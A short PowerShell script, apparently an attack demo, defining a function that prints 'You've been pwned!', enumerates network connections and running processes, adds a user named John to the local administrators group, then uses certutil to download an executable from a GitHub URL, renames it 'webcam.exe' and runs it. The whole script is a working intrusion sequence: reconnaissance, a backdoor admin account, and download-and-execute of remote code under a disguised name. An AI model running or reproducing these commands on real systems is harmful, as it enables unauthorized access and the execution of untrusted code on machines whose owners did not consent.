function Invoke-Tech
{
	Write-Host "You've been pwned! v5";
	Start-Sleep 1;
	Write-Host "Running Netstat";
	netstat -an;
	#Start-Process "cmd.exe" '/c netstat -an;'
	#& "netstat" "-an"
	Start-Sleep 1;
	Write-Host "Getting Tasks";
	tasklist;
	#Start-Process "cmd.exe" '/c tasklist;'
	#& "tasklist"
	Start-Sleep 1;
	Write-Host "Adding Users";
	net localgroup administrators John /add
	Start-Sleep 1;
	Write-Host "Downloading Webcam";
	certutil -urlcache -split -f "https://raw.githubusercontent.com/tmmdemo/thenothing/master/TheNothing.exe" "webcam.exe"
	Start-Sleep 1;
	Write-Host "Running Webcam";
	webcam.exe -stream
}
